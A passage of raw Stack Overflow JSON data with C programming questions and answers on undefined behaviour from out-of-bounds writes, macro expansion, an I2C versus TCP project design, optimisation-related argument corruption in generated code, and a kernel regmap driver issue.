"creation_date": 1524595272, "post_id": 50008631, "comment_id": 87033980, "body": "&quot;Why it does not give segmentation fault?&quot; because the behaviour is <i>undefined</i>. If it was <b>guaranteed</b> to give a segfault, the behaviour would be <i>defined</i> but it isn&#39;t."}, {"owner": {"reputation": 35, "user_id": 7212295, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/78df7fdac93781e518fd63f9dc95aed5?s=128&d=identicon&r=PG&f=1", "display_name": "era", "link": "https://stackoverflow.com/users/7212295/era"}, "edited": false, "score": 0, "creation_date": 1524595516, "post_id": 50008631, "comment_id": 87034109, "body": "Thanks. Got it. We were doing this in lab and lab is over, instructor hasn&#39;t provided solutions yet. I am just curious to know it before solutions"}], "answers": [{"comments": [{"owner": {"reputation": 11081, "user_id": 2161954, "user_type": "registered", "accept_rate": 93, "profile_image": "https://www.gravatar.com/avatar/eccdcef378f17549482325c2051c4048?s=128&d=identicon&r=PG", "display_name": "SnakeDoc", "link": "https://stackoverflow.com/users/2161954/snakedoc"}, "edited": false, "score": 0, "creation_date": 1524595604, "post_id": 50008757, "comment_id": 87034154, "body": "Maybe explain the why... it&#39;s reading memory that wasn&#39;t allocated to the program, so it&#39;s considered &quot;garbage&quot;, and may or may not convert to, in this case, printable ascii characters. In some cases, the memory may be protected and cause a segfault, in others your program will just read whatever data populates those memory addresses."}], "tags": [], "owner": {"reputation": 158911, "user_id": 1687119, "user_type": "registered", "accept_rate": 75, "profile_image": "https://www.gravatar.com/avatar/f9c3036c1979d65847da3bdc271bb5b9?s=128&d=identicon&r=PG", "display_name": "dbush", "link": "https://stackoverflow.com/users/1687119/dbush"}, "is_accepted": true, "score": 3, "last_activity_date": 1524595281, "creation_date": 1524595281, "answer_id": 50008757, "question_id": 50008631, "link": "https://stackoverflow.com/questions/50008631/did-not-understand-why-the-following-output-of-program-in-c-is-so/50008757#50008757", "title": "Did not understand why the following output of program in C is so", "body": "<p>When you read or write past the end of allocated memory, you invoke <a href=\"https://en.wikipedia.org/wiki/Undefined_behavior\" rel=\"nofollow noreferrer\">undefined behavior</a>.  </p>\n\n<p>This means you can't reliably predict the behavior of your program.  It may crash, it may generate strange results, or it may appear to work properly.  How undefined behavior manifests itself can change with a seemingly unrelated code change, such as adding an extra unused variable or adding a <code>printf</code> for debugging.</p>\n\n<p>Just because you do something that <em>could</em> cause the program to crash doesn't  mean that it <em>will</em>.</p>\n"}], "owner": {"reputation": 35, "user_id": 7212295, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/78df7fdac93781e518fd63f9dc95aed5?s=128&d=identicon&r=PG&f=1", "display_name": "era", "link": "https://stackoverflow.com/users/7212295/era"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 78, "favorite_count": 0, "closed_date": 1524675667, "accepted_answer_id": 50008757, "answer_count": 1, "score": -1, "last_activity_date": 1524595281, "creation_date": 1524594770, "question_id": 50008631, "link": "https://stackoverflow.com/questions/50008631/did-not-understand-why-the-following-output-of-program-in-c-is-so", "closed_reason": "Needs details or clarity", "title": "Did not understand why the following output of program in C is so", "body": "<p>The program below is printing:</p>\n\n<p>b \nc\nd\ne\nf\ng\nh\ni\nj\nk\nl\nm</p>\n\n<p>l\nm\nn\no\np\nand (5 spaces)</p>\n\n<p>I don't know why it is printing so. I allocated a size of 10 chars, and wanted to see what will happen if I print it until 12. Please, help me </p>\n\n<pre><code>int main(){\n    char *sentences = (char*) malloc(sizeof(char)*10);\n    int a;\n\n    for(a = 0; a &lt; 12; a++){\n       sentences[a] = 'b' + a;\n    }\n\n    for(a = 0; a &lt; 12; a++){\n        printf(\"%c\", sentences[a]);\n    }\n\n    printf(\"\\n\");\n    //here I should free allocated memory, to avoid memory leak \n    sentences = (char *) malloc(sizeof(char)*5);\n\n    for(a = 0; a &lt; 5; a++){\n        sentences[a] = 'l' + a;\n    }\n\n    for (a = 0; a &lt; 10; a++){\n        printf( \"%c\", sentences[a]);\n    }\n   free(sentences);\n}\n</code></pre>\n"}, {"tags": ["c"], "comments": [{"owner": {"reputation": 21147, "user_id": 7733418, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/b08876b87c096cd006f66820ffc67f27?s=128&d=identicon&r=PG", "display_name": "Yunnosch", "link": "https://stackoverflow.com/users/7733418/yunnosch"}, "edited": false, "score": 2, "creation_date": 1524594285, "post_id": 50008470, "comment_id": 87033477, "body": "Please give more information. Show at least the definition of the macro. Maybe try for a <a href=\"https://stackoverflow.com/help/minimal-reproducible-example\">minimal reproducible example</a>."}, {"owner": {"reputation": 21147, "user_id": 7733418, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/b08876b87c096cd006f66820ffc67f27?s=128&d=identicon&r=PG", "display_name": "Yunnosch", "link": "https://stackoverflow.com/users/7733418/yunnosch"}, "edited": false, "score": 0, "creation_date": 1524594342, "post_id": 50008470, "comment_id": 87033510, "body": "You could try to preprocess the a file with this line to see what the macro is doing. This is helpful if the macro is complicated."}, {"owner": {"reputation": 191202, "user_id": 147356, "user_type": "registered", "accept_rate": 54, "profile_image": "https://www.gravatar.com/avatar/b9506717d24256a090524dd5505d3207?s=128&d=identicon&r=PG", "display_name": "larsks", "link": "https://stackoverflow.com/users/147356/larsks"}, "edited": false, "score": 3, "creation_date": 1524594389, "post_id": 50008470, "comment_id": 87033537, "body": "<code>UIMsg()</code> probably evaluates to a function name, so <code>(tseval)</code> provides the arguments to that function call."}, {"owner": {"reputation": 21, "user_id": 4465805, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/59e6d1cee55d1ce035ed8f15a7644c4a?s=128&d=identicon&r=PG&f=1", "display_name": "salza", "link": "https://stackoverflow.com/users/4465805/salza"}, "edited": false, "score": 0, "creation_date": 1524595081, "post_id": 50008470, "comment_id": 87033884, "body": "The macro is: <code>#define UiMsg(obj, member)       (obj)-&gt;msg-&gt;member</code>"}], "answers": [{"tags": [], "owner": {"reputation": 158911, "user_id": 1687119, "user_type": "registered", "accept_rate": 75, "profile_image": "https://www.gravatar.com/avatar/f9c3036c1979d65847da3bdc271bb5b9?s=128&d=identicon&r=PG", "display_name": "dbush", "link": "https://stackoverflow.com/users/1687119/dbush"}, "is_accepted": false, "score": 3, "last_activity_date": 1524596825, "creation_date": 1524596825, "answer_id": 50009162, "question_id": 50008470, "link": "https://stackoverflow.com/questions/50008470/what-does-the-final-set-of-parentheses-mean-on-this-line/50009162#50009162", "title": "What does the final set of parentheses mean on this line?", "body": "<p>Since <code>UiMsg</code> is a function-like macro, the first set of parenthesis after it are the arguments to the macro.  So you first need to perform the macro substitution to see what is happening.</p>\n\n<p>So this:</p>\n\n<pre><code>tempState = (ShowSelectState)UiMsg(tseval, current_index)(tseval);\n</code></pre>\n\n<p>Becomes:</p>\n\n<pre><code>tempState = (ShowSelectState)(tseval)-&gt;msg-&gt;current_index(tseval);\n</code></pre>\n\n<p>Now we can see that the second set of parenthesis denotes the arguments of the <code>current_index</code> member, which presumably is a function pointer.</p>\n"}], "owner": {"reputation": 21, "user_id": 4465805, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/59e6d1cee55d1ce035ed8f15a7644c4a?s=128&d=identicon&r=PG&f=1", "display_name": "salza", "link": "https://stackoverflow.com/users/4465805/salza"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 58, "favorite_count": 0, "answer_count": 1, "score": 0, "last_activity_date": 1524596825, "creation_date": 1524594101, "question_id": 50008470, "link": "https://stackoverflow.com/questions/50008470/what-does-the-final-set-of-parentheses-mean-on-this-line", "title": "What does the final set of parentheses mean on this line?", "body": "<p>What do the last set of parentheses on this line mean? The first set I know is a typecast, the second part (UiMsg) is a macro. What does (tseval) at the end do?</p>\n\n<pre><code>tempState = (ShowSelectState)UiMsg(tseval, current_index)(tseval);\n</code></pre>\n"}, {"tags": ["c", "tcp", "raspberry-pi", "i2c", "psoc"], "comments": [{"owner": {"reputation": 170455, "user_id": 149341, "user_type": "registered", "accept_rate": 50, "profile_image": "https://i.stack.imgur.com/omfTQ.png?s=128&g=1", "display_name": "duskwuff -inactive-", "link": "https://stackoverflow.com/users/149341/duskwuff-inactive"}, "edited": false, "score": 1, "creation_date": 1524607171, "post_id": 50008342, "comment_id": 87039062, "body": "Let&#39;s step back a minute. Why are there two separate Raspberry Pis in your project?"}, {"owner": {"reputation": 1, "user_id": 9105477, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/74d72753d14a6f39969a0fe6092ee15d?s=128&d=identicon&r=PG&f=1", "display_name": "Badabim", "link": "https://stackoverflow.com/users/9105477/badabim"}, "reply_to_user": {"reputation": 170455, "user_id": 149341, "user_type": "registered", "accept_rate": 50, "profile_image": "https://i.stack.imgur.com/omfTQ.png?s=128&g=1", "display_name": "duskwuff -inactive-", "link": "https://stackoverflow.com/users/149341/duskwuff-inactive"}, "edited": false, "score": 0, "creation_date": 1524646006, "post_id": 50008342, "comment_id": 87051714, "body": "@duskwuff because we stream PiCam on the 1. one and it uses too much of the capacity, so we cannot put the other codes/programs in the same pi. I know that the rpi 3 could solve the problem, but we are not allowed to use other rpi&#39;s other than the rpi zero."}], "answers": [{"tags": [], "owner": {"reputation": 194, "user_id": 6373744, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/7e592baae5c2d33a2e6bb4f44e495162?s=128&d=identicon&r=PG&f=1", "display_name": "Bwood94", "link": "https://stackoverflow.com/users/6373744/bwood94"}, "is_accepted": false, "score": 0, "last_activity_date": 1524605858, "creation_date": 1524605858, "answer_id": 50011055, "question_id": 50008342, "link": "https://stackoverflow.com/questions/50008342/tcp-needed-when-i2c-and-ssh-are-used/50011055#50011055", "title": "Tcp needed when i2c and ssh are used?", "body": "<p>There is no clear way to answer whether TCP is better than I2C without more info about your project, as that is an application-specific question. This question would be easier to answer with a little more detail on your project, including requirements, data rates, etc., but I will try to give you some info based on personal experience. </p>\n\n<p>The only reason to consider TCP/IP between the devices is if the data rate needed is higher than I2C can support, or if it would be useful to keep them separated beyond I2C range. </p>\n\n<p>Creating a program that utilizes TCP to run on your phone and the master would make the system a little more complete, as you would have a program running on the master constantly to automatically accept information from the user and run the commands, rather than having to control it from the command line. This would also force you to create some sort of user-facing program for the phone. From a design perspective for a class project, this could be preferable.</p>\n\n<p>Without knowing why your teacher suggested that it is hard to give you a straight answer; it is possible the suggestion was given not for any real performance reasons but for you to learn about networking, TCP/IP protocols, or to be able to say you have \"IoT experience\". </p>\n"}], "owner": {"reputation": 1, "user_id": 9105477, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/74d72753d14a6f39969a0fe6092ee15d?s=128&d=identicon&r=PG&f=1", "display_name": "Badabim", "link": "https://stackoverflow.com/users/9105477/badabim"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": false, "view_count": 97, "favorite_count": 0, "answer_count": 1, "score": -1, "last_activity_date": 1524611780, "creation_date": 1524593612, "last_edit_date": 1524611780, "question_id": 50008342, "link": "https://stackoverflow.com/questions/50008342/tcp-needed-when-i2c-and-ssh-are-used", "title": "Tcp needed when i2c and ssh are used?", "body": "<p>I'm doing a project where I have 2 raspberry pi zeros connected and a psoc 5 connected to one of the rpi's. </p>\n\n<p>The connection between them are all i2c. \nOne of the rpi's are considered the \"master\" and from my android phone I will use ssh to remote control the master.</p>\n\n<pre><code>[Phone] = SSH = [RPi Master] = I2C = [RPi Slave]\n                               ||\n                            [PSOC 5]\n</code></pre>\n\n<p>My teacher told me to consider tcp/ip, but I will still have the 2 rpi's and the psoc connected by wires.</p>\n\n<p>My question therefore is - are there any benefits in doing tcp in my project?</p>\n"}, {"tags": ["c", "linux", "corruption", "gcc4"], "comments": [{"owner": {"reputation": 5189, "user_id": 5223757, "user_type": "registered", "accept_rate": 78, "profile_image": "https://i.stack.imgur.com/FdOvO.png?s=128&g=1", "display_name": "wizzwizz4", "link": "https://stackoverflow.com/users/5223757/wizzwizz4"}, "edited": false, "score": 3, "creation_date": 1524593305, "post_id": 50008224, "comment_id": 87032946, "body": "Almost certainly Undefined Behaviour."}, {"owner": {"reputation": 31114, "user_id": 4142924, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/KmZTf.png?s=128&g=1", "display_name": "Weather Vane", "link": "https://stackoverflow.com/users/4142924/weather-vane"}, "edited": false, "score": 3, "creation_date": 1524593657, "post_id": 50008224, "comment_id": 87033154, "body": "How do you know that &quot;modifying the code to make it more readable&quot; didn&#39;t remove the bug? There are reasons for providing the  <a href=\"http://stackoverflow.com/help/mcve\">Minimal, Complete, and Verifiable example</a> that shows the problem. One is that your code can be compiled and run. Another is that the very act of honing the code down can often reveal the problem anyway."}, {"owner": {"reputation": 877, "user_id": 3666903, "user_type": "registered", "accept_rate": 52, "profile_image": "https://i.stack.imgur.com/1i0Z6.jpg?s=128&g=1", "display_name": "bl4ckb0ne", "link": "https://stackoverflow.com/users/3666903/bl4ckb0ne"}, "reply_to_user": {"reputation": 31114, "user_id": 4142924, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/KmZTf.png?s=128&g=1", "display_name": "Weather Vane", "link": "https://stackoverflow.com/users/4142924/weather-vane"}, "edited": false, "score": 1, "creation_date": 1524594263, "post_id": 50008224, "comment_id": 87033464, "body": "@WeatherVane I did several tries to come to that answer. I did that because there is several calls to <code>DIVISION_SIM</code> in the same function and I wanted to see which one was corrupted. I can put back the generated function if you&#39;d like"}, {"owner": {"reputation": 877, "user_id": 3666903, "user_type": "registered", "accept_rate": 52, "profile_image": "https://i.stack.imgur.com/1i0Z6.jpg?s=128&g=1", "display_name": "bl4ckb0ne", "link": "https://stackoverflow.com/users/3666903/bl4ckb0ne"}, "reply_to_user": {"reputation": 2267, "user_id": 8242447, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/M6884.gif?s=128&g=1", "display_name": "\u1e42\u0173\u1efb\u1ecbg\u01fb\u0148\u1ea1c\u1ec3\u01a1\u1eed\u1e69", "link": "https://stackoverflow.com/users/8242447/%e1%b9%82%c5%b3%e1%bb%bb%e1%bb%8bg%c7%bb%c5%88%e1%ba%a1c%e1%bb%83%c6%a1%e1%bb%ad%e1%b9%a9"}, "edited": false, "score": 1, "creation_date": 1524597772, "post_id": 50008224, "comment_id": 87035304, "body": "@Mulliganaceous the memory allocation in this is handled by <a href=\"https://github.com/ivmai/bdwgc\" rel=\"nofollow noreferrer\">libgc</a>"}, {"owner": {"reputation": 82953, "user_id": 608639, "user_type": "registered", "accept_rate": 64, "profile_image": "https://i.stack.imgur.com/aPIhh.jpg?s=128&g=1", "display_name": "jww", "link": "https://stackoverflow.com/users/608639/jww"}, "edited": false, "score": 0, "creation_date": 1524612698, "post_id": 50008224, "comment_id": 87040501, "body": "Compile with <code>-Wcast-align</code> and run under the undefined behavior sanitizer or <code>-fsanitize=undefined</code>. Look for misaligned loads related to your floats and doubles."}, {"owner": {"reputation": 877, "user_id": 3666903, "user_type": "registered", "accept_rate": 52, "profile_image": "https://i.stack.imgur.com/1i0Z6.jpg?s=128&g=1", "display_name": "bl4ckb0ne", "link": "https://stackoverflow.com/users/3666903/bl4ckb0ne"}, "reply_to_user": {"reputation": 82953, "user_id": 608639, "user_type": "registered", "accept_rate": 64, "profile_image": "https://i.stack.imgur.com/aPIhh.jpg?s=128&g=1", "display_name": "jww", "link": "https://stackoverflow.com/users/608639/jww"}, "edited": false, "score": 0, "creation_date": 1524616243, "post_id": 50008224, "comment_id": 87041188, "body": "@jww unfortunately I cannot use any sanitizer with tha current setup."}, {"owner": {"reputation": 811, "user_id": 9493582, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/bfI3b.jpg?s=128&g=1", "display_name": "Arndt Jonasson", "link": "https://stackoverflow.com/users/9493582/arndt-jonasson"}, "edited": false, "score": 0, "creation_date": 1524656632, "post_id": 50008224, "comment_id": 87058591, "body": "Do we know that <code>modelica_real</code> is the same thing as <code>double</code>?"}, {"owner": {"reputation": 877, "user_id": 3666903, "user_type": "registered", "accept_rate": 52, "profile_image": "https://i.stack.imgur.com/1i0Z6.jpg?s=128&g=1", "display_name": "bl4ckb0ne", "link": "https://stackoverflow.com/users/3666903/bl4ckb0ne"}, "reply_to_user": {"reputation": 811, "user_id": 9493582, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/bfI3b.jpg?s=128&g=1", "display_name": "Arndt Jonasson", "link": "https://stackoverflow.com/users/9493582/arndt-jonasson"}, "edited": false, "score": 0, "creation_date": 1524660971, "post_id": 50008224, "comment_id": 87061894, "body": "@ArndtJonasson yes, I did a search in the available sources"}, {"owner": {"reputation": 811, "user_id": 9493582, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/bfI3b.jpg?s=128&g=1", "display_name": "Arndt Jonasson", "link": "https://stackoverflow.com/users/9493582/arndt-jonasson"}, "edited": false, "score": 0, "creation_date": 1524664714, "post_id": 50008224, "comment_id": 87064467, "body": "Is there a chance to see the complete code, so it can be tried out?"}, {"owner": {"reputation": 877, "user_id": 3666903, "user_type": "registered", "accept_rate": 52, "profile_image": "https://i.stack.imgur.com/1i0Z6.jpg?s=128&g=1", "display_name": "bl4ckb0ne", "link": "https://stackoverflow.com/users/3666903/bl4ckb0ne"}, "reply_to_user": {"reputation": 811, "user_id": 9493582, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/bfI3b.jpg?s=128&g=1", "display_name": "Arndt Jonasson", "link": "https://stackoverflow.com/users/9493582/arndt-jonasson"}, "edited": false, "score": 0, "creation_date": 1524666954, "post_id": 50008224, "comment_id": 87066031, "body": "@ArndtJonasson it&#39;s a 5Mb archive of raw code, do you still want it ?"}, {"owner": {"reputation": 811, "user_id": 9493582, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/bfI3b.jpg?s=128&g=1", "display_name": "Arndt Jonasson", "link": "https://stackoverflow.com/users/9493582/arndt-jonasson"}, "edited": false, "score": 0, "creation_date": 1524667162, "post_id": 50008224, "comment_id": 87066172, "body": "Not really. Is it in <code>__OMC_DIV_SIM</code> that the crash occurs? It seems to just pass <code>msg</code> on to two other functions."}, {"owner": {"reputation": 877, "user_id": 3666903, "user_type": "registered", "accept_rate": 52, "profile_image": "https://i.stack.imgur.com/1i0Z6.jpg?s=128&g=1", "display_name": "bl4ckb0ne", "link": "https://stackoverflow.com/users/3666903/bl4ckb0ne"}, "reply_to_user": {"reputation": 811, "user_id": 9493582, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/bfI3b.jpg?s=128&g=1", "display_name": "Arndt Jonasson", "link": "https://stackoverflow.com/users/9493582/arndt-jonasson"}, "edited": false, "score": 0, "creation_date": 1524667203, "post_id": 50008224, "comment_id": 87066197, "body": "Let us <a href=\"https://chat.stackoverflow.com/rooms/169770/discussion-between-bl4ckb0ne-and-arndt-jonasson\">continue this discussion in chat</a>."}], "owner": {"reputation": 877, "user_id": 3666903, "user_type": "registered", "accept_rate": 52, "profile_image": "https://i.stack.imgur.com/1i0Z6.jpg?s=128&g=1", "display_name": "bl4ckb0ne", "link": "https://stackoverflow.com/users/3666903/bl4ckb0ne"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": false, "view_count": 98, "favorite_count": 0, "answer_count": 0, "score": 0, "last_activity_date": 1524593183, "creation_date": 1524593183, "question_id": 50008224, "link": "https://stackoverflow.com/questions/50008224/arguments-corruption", "title": "Arguments corruption", "body": "<p>I'm experiencing weird behavior  when data is passed to a certain function in some generated code. The problem occurs whenever optimizations are enabled (<code>-O1</code>, and higher). But not on <code>-O0</code>.</p>\n\n<p>The C code is generated by <a href=\"https://github.com/OpenModelica/OpenModelica\" rel=\"nofollow noreferrer\">OpenModelica 1.13.0-dev</a>, and compiled on Centos 6.9 32 bits using gcc 4.4.7. I know my setup is a bit old, but I can't do otherwise.</p>\n\n<p>I was able to step into the code with gdb to get a backtrace of the faulty function with <code>-O0</code></p>\n\n<pre><code>__OMC_DIV_SIM (threadData=0x83bb7e0, a=0.90000000000000002, b=1, msg=0xac4f6024 \"PMECH1 - D * SLIP / 1.0 + SLIP\", equationIndexes=0xbfffd4a0,\n    noThrowDivZero=1 '\\001', time_=0, initial_=1 '\\001')\n</code></pre>\n\n<p>And here's a backtrace of the same function with <code>-O2</code></p>\n\n<pre><code>__OMC_DIV_SIM (threadData=0x83bb7a8, a=-9.2559642734470712e+61, b=5.298772688916812e-315, msg=0x1 &lt;Address 0x1 out of bounds&gt;,\n    equationIndexes=0x3ff00000, noThrowDivZero=-60 '\\304', time_=3.7134892271125328e-314, initial_=0 '\\000')\n</code></pre>\n\n<p>All researches for <code>Address 0x1 out of bounds</code> are pointing to stack or memory corruption. I then ran my executable through valgrind.</p>\n\n<pre><code>==5351== Invalid read of size 1\n==5351==    [...]\n==5351==    by 0x7EA13F4: __OMC_DIV_SIM (division.h:66)\n==5351==    [...]\n==5351==  Address 0x1 is not stack'd, malloc'd or (recently) free'd\n==5351==\n==5351==\n==5351== Process terminating with default action of signal 11 (SIGSEGV)\n==5351==  Access not within mapped region at address 0x1\n==5351==    [...]\n==5351==    by 0x7EA13F4: __OMC_DIV_SIM (division.h:66)\n==5351==    [...]\n==5351==  If you believe this happened as a result of a stack\n==5351==  overflow in your program's main thread (unlikely but\n==5351==  possible), you can try to increase the size of the\n==5351==  main thread stack using the --main-stacksize= flag.\n==5351==  The main thread stack size used in this run was 8388608.\n</code></pre>\n\n<p>The code is not so useful, since it's not for the user to read. I modified it a bit to make it more readable and to pinpoint the exact problem.</p>\n\n<pre><code>    double value = 0.0;\n    if ((long)data-&gt;localData[0]-&gt;integerVars[0] /* TRIPI */ == ((long) 0))\n    {\n            double PMECH1 = data-&gt;localData[0]-&gt;realVars[24];\n            double D = data-&gt;simulationInfo-&gt;realParameter[21];\n            double SLIP = data-&gt;localData[0]-&gt;realVars[4];\n            double TELEC = data-&gt;localData[0]-&gt;realVars[35];\n            double H = data-&gt;simulationInfo-&gt;realParameter[24];\n\n            double div_1 = 0.0;\n            {\n                    double a = PMECH1 - ((D) * (SLIP));\n                    double b = 1.0 + SLIP;\n\n                    div_1 = __OMC_DIV_SIM(threadData, a, b, \"PMECH1 - D * SLIP / 1.0 + SLIP\", equationIndexes, data-&gt;simulationInfo-&gt;noThrowDivZero, data-&gt;localData[0]-&gt;timeValue, initial());\n            }\n            // ...\n    }\n</code></pre>\n\n<p>Then here's the file that contains <code>__OMC_DIV_SIM</code></p>\n\n<pre><code>#define DIVISION_SIM(a,b,msg,equation) (__OMC_DIV_SIM(threadData, a, b, msg, equationIndexes, data-&gt;simulationInfo-&gt;noThrowDivZero, data-&gt;localData[0]-&gt;timeValue, initial()))\n\nint valid_number(double a)\n{\n  return !isnan(a) &amp;&amp; !isinf(a);\n}\n\nstatic inline modelica_real __OMC_DIV_SIM(threadData_t *threadData, const modelica_real a, const modelica_real b, const char *msg, const int *equationIndexes, modelica_boolean noThrowDivZero, const modelica_real time_, const modelica_boolean initial_)\n{\n  modelica_real res;\n  if(b != 0.0)\n    res = a/b;\n  else if(initial_ &amp;&amp; a == 0.0)\n    res = 0.0;\n  else\n    res = a / division_error_equation_time(threadData, a, b, msg, equationIndexes, time_, noThrowDivZero);\n\n  if(!valid_number(res))\n    throwStreamPrintWithEquationIndexes(threadData, equationIndexes, \"division leads to inf or nan at time %g, (a=%g) / (b=%g), where divisor b is: %s\", time_, a, b, msg);\n  return res;\n}\n</code></pre>\n\n<p>I cannot test that code with a different gcc, but I was able to test another component with the same environment, and it passed without any trouble.\nI am still clueless about what is corrupting the data given to the <code>__OMC_DIV_SIM</code>. Could it be a bug in the compiler ? Or in the generated code?</p>\n"}, {"tags": ["c", "linux-kernel", "linux-device-driver", "embedded-linux"], "comments": [{"owner": {"reputation": 12261, "user_id": 3866447, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/52ieQ.jpg?s=128&g=1", "display_name": "Sam Protsenko", "link": "https://stackoverflow.com/users/3866447/sam-protsenko"}, "edited": false, "score": 0, "creation_date": 1524604955, "post_id": 50008177, "comment_id": 87038352, "body": "1. Which exactly kernel version do you use? 2. Can you try <code>regmap_raw_read()</code> instead?"}, {"owner": {"reputation": 19, "user_id": 9690994, "user_type": "registered", "profile_image": "https://lh3.googleusercontent.com/-XdUIqdMkCWA/AAAAAAAAAAI/AAAAAAAAAAA/4252rscbv5M/photo.jpg?sz=128", "display_name": "AlexS", "link": "https://stackoverflow.com/users/9690994/alexs"}, "reply_to_user": {"reputation": 12261, "user_id": 3866447, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/52ieQ.jpg?s=128&g=1", "display_name": "Sam Protsenko", "link": "https://stackoverflow.com/users/3866447/sam-protsenko"}, "edited": false, "score": 0, "creation_date": 1524668822, "post_id": 50008177, "comment_id": 87067385, "body": "1. <code>uname -r</code> returns me <code>3.10.96+</code>, but I&#39;m using <a href=\"https://developer.nvidia.com/embedded/dlc/l4t-24-1-kernel-sources\" rel=\"nofollow noreferrer\">nVidia&#39;s provided source code</a>. 2. Tried <code>regmap_raw_read()</code> now, but its behavior was the same as the regular one."}, {"owner": {"reputation": 12261, "user_id": 3866447, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/52ieQ.jpg?s=128&g=1", "display_name": "Sam Protsenko", "link": "https://stackoverflow.com/users/3866447/sam-protsenko"}, "edited": false, "score": 0, "creation_date": 1524696689, "post_id": 50008177, "comment_id": 87080887, "body": "I think that there might be some bug in regmap implementation in kernel. <code>git log v3.10..HEAD -- drivers&#47;base&#47;regmap&#47;</code> in mainline kernel shows a huge delta. Can you check if some patches from that delta look like fix for your problem? I&#39;d search for &quot;cache&quot; word in that <code>git log</code> output for starters, starting from oldest patches up to newest ones... Also, is there any chance you can try the same code on newer kernel? Another explanation is that register value in hardware is actually the one you get. Can you try some direct I2C access to confirm that?"}, {"owner": {"reputation": 19, "user_id": 9690994, "user_type": "registered", "profile_image": "https://lh3.googleusercontent.com/-XdUIqdMkCWA/AAAAAAAAAAI/AAAAAAAAAAA/4252rscbv5M/photo.jpg?sz=128", "display_name": "AlexS", "link": "https://stackoverflow.com/users/9690994/alexs"}, "reply_to_user": {"reputation": 12261, "user_id": 3866447, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/52ieQ.jpg?s=128&g=1", "display_name": "Sam Protsenko", "link": "https://stackoverflow.com/users/3866447/sam-protsenko"}, "edited": false, "score": 0, "creation_date": 1524848738, "post_id": 50008177, "comment_id": 87150761, "body": "Now, that&#39;s definitely somewhat trickier to test, because the fork I&#39;m using probably already has some nVidia-specific customizations. Then, naively substituting the <code>regmap&#47;</code> folder, as I expected, broke the compilation, but I didn&#39;t go too far on this case. I tried just substituting <code>regmap_read()</code> and <code>_regmap_read()</code> code and that got me the same behavior as before. Trying to substitute <code>regmap_raw_read()</code> and <code>_regmap_raw_read()</code> was far more complicated and I ultimately couldn&#39;t do it manually. (cont&#39;d)"}, {"owner": {"reputation": 19, "user_id": 9690994, "user_type": "registered", "profile_image": "https://lh3.googleusercontent.com/-XdUIqdMkCWA/AAAAAAAAAAI/AAAAAAAAAAA/4252rscbv5M/photo.jpg?sz=128", "display_name": "AlexS", "link": "https://stackoverflow.com/users/9690994/alexs"}, "reply_to_user": {"reputation": 12261, "user_id": 3866447, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/52ieQ.jpg?s=128&g=1", "display_name": "Sam Protsenko", "link": "https://stackoverflow.com/users/3866447/sam-protsenko"}, "edited": false, "score": 0, "creation_date": 1524849117, "post_id": 50008177, "comment_id": 87150920, "body": "(...) There&#39;s still the possibility for me to try another kernel version, but I do have some other more urgent tasks to do. For now I think this probably has to do with what you said about it being on the hardware side of things. As for the I2C direct access, I&#39;m not really sure about how to do it correctly. I tried <code>i2cdump -f</code> but it gets me a table full of <code>XX</code>s and <code>dmesg</code> shows a <code>no acknowledge from address 0x**</code> for each read (I tested this with my camera driver both enabled and disabled, same result)."}, {"owner": {"reputation": 12261, "user_id": 3866447, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/52ieQ.jpg?s=128&g=1", "display_name": "Sam Protsenko", "link": "https://stackoverflow.com/users/3866447/sam-protsenko"}, "edited": false, "score": 0, "creation_date": 1524858373, "post_id": 50008177, "comment_id": 87155086, "body": "For direct I2C access -- I meant, do that from your kernel code (driver). See <a href=\"https://www.kernel.org/doc/Documentation/i2c/writing-clients\" rel=\"nofollow noreferrer\">Documentation/i2c/writing-clients</a> for details (&quot;Sending and receiving&quot; section). Of course, just replacing the file from newer kernel version won&#39;t work. You need to <code>git cherry-pick</code> relevant patches, or pull them by hand. But it&#39;s easier to test your driver on new kernel first. If bug persists -- it&#39;s not about fixing <code>regmap</code> framework. And if raw I2C read shows you the same value (on your old kernel version) -- then it&#39;s your hardware behavior."}, {"owner": {"reputation": 19, "user_id": 9690994, "user_type": "registered", "profile_image": "https://lh3.googleusercontent.com/-XdUIqdMkCWA/AAAAAAAAAAI/AAAAAAAAAAA/4252rscbv5M/photo.jpg?sz=128", "display_name": "AlexS", "link": "https://stackoverflow.com/users/9690994/alexs"}, "reply_to_user": {"reputation": 12261, "user_id": 3866447, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/52ieQ.jpg?s=128&g=1", "display_name": "Sam Protsenko", "link": "https://stackoverflow.com/users/3866447/sam-protsenko"}, "edited": false, "score": 1, "creation_date": 1525360488, "post_id": 50008177, "comment_id": 87334727, "body": "So I tried reading with <code>i2c_master_recv()</code> and it, once again, got me the same value. Guess it really is the hardware behavior then. (btw, huge thanks, Sam!)"}, {"owner": {"reputation": 3561, "user_id": 2511795, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/30c869f55cbcf82a7bc4536d563daa0a?s=128&d=identicon&r=PG", 